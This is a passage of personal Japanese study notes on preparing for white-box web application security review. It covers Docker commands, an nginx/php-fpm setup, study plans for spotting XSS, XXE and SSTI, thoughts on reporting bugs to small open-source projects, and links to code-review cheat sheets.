イメージも削除する。一から作り直すときとか。  
- `docker stop 23fba3fd85c4`   
コンテナを停止する。   
- `docker stop $(docker ps -q)`  
すべてのコンテナを停止する  

### nginx + php-fpm
これが動いている。他はdocker-compose.ymlが間違ってたりnginxのnginx.confが存在していなかったりするので注意。   
https://github.com/mochizukikotaro/docker-nginx-phpfpm/blob/master/README.md   
https://qiita.com/mochizukikotaro/items/b398076cb57492980447   
上の解説記事。   
nginxのconfファイルの以下の`fastcgi-pass`でlocalhostの9000ポートで待機しているPHP-fpmの通信してそこのfastcgiにphpファイルを渡してPHPを実行している。  
なのでnginxのコンテナ上にはphpファイルを置く必要なし。  
```txt
    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass php:9000;
```

# メモ
とにかくコードを読みなれている必要があるらしい。それが一番大事っぽい。それが今全然できないしHTBやっててもそれは伸びない気がする。   
まずはudemyとかpentesterAcademyのPHP,NodeJS,.net,JavaのWebアプリ開発コースを受講する必要がありそう。   
あとは脆弱性ごとにそれに該当するコード群と発見方法、着眼点とかを自分なりにまとめる必要がありそう。CVEとかも参考にした方がよさそう。   
受講は2月の春休み開始直後から1カ月でとりたい！それまでにいろいろ計画的に勉強するべし！
XXE,SSTI,C#関係、XSS関係がイマイチ。まだ具体例が少なすぎるからもっと増やす！   
あとある程度理解したらHTBで腕試すのがよさそう？？   
`sudo service apache2 start`  

以下程度はある程度大きめのMVCとか読んでどんな感じで実現されてるのか確認した方がよさそう！  
```txt
ログイン
パスワードリセット
セッション、認証
ファイルアップロード
フォーム
MVC
ルーティング
用意されてる入力のサニタイジング
API
```
報告する場合はgithubがちゃんと動いてて他の脆弱性にも対応してるのか確認したほうがよさそう。  
そもそも動いてないのに報告しても空気読めてなくて悲報になりそう。  
ただその分超複雑なソースにはなってないから普通に勉強になっていい。まあスター数少なくてかつ動いてるプロジェクトがあれば報告してもよさそう。  
あとNode.jsベースのCMSはそもそも依存関係に脆弱性あってそれを放置してるプロジェクトとかはCMSにXSSとかを報告しても意味なさそう。  
https://snyk.io/advisor/npm-package/cody#versions  
とかは動いてなさそうだから報告しても意味なさげ？？  
https://snyk.io/advisor/npm-package/ghost#versions  
これはめっちゃ動いてる。ただスター数えぐくて見つけるのもしんどそう。  
# ToDO
https://github.com/wectf/2020   
https://github.com/TeamHarekaze/HarekazeCTF2019-challenges   

# 参考資料
https://alex-labs.com/my-awae-review-becoming-an-oswe/   
ホワイトボックスの方法論的なことが書いてある。超参考になりそう。   
   
https://stacktrac3.co/oswe-review-awae-course/   
こっちにも方法論的なことが書いてある。   
https://blog.codecamp.jp/programming-docker-image-container   
DockerコンテナとDockerイメージについて   
https://qiita.com/hiyuzawa/items/81490020568417d85e86   
Dockerでの基礎的な操作が大体全部かかれてる   
http://okumocchi.jp/php/re.php  
PHPの`preg_match`、JavaScriptの`match`関数で正規表現をチェックできる。  
https://www.debuggex.com/  
正規表現がどんな感じで動くかわかりやすい。  
  
以下Whiteboxのチートシート  
https://pentesterlab.com/exercises/codereview/course  
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html  
https://github.com/softwaresecured/secure-code-review-checklist  
https://littlemaninmyhead.wordpress.com/2019/08/04/dont-underestimate-grep-based-code-scanning/  
https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet  
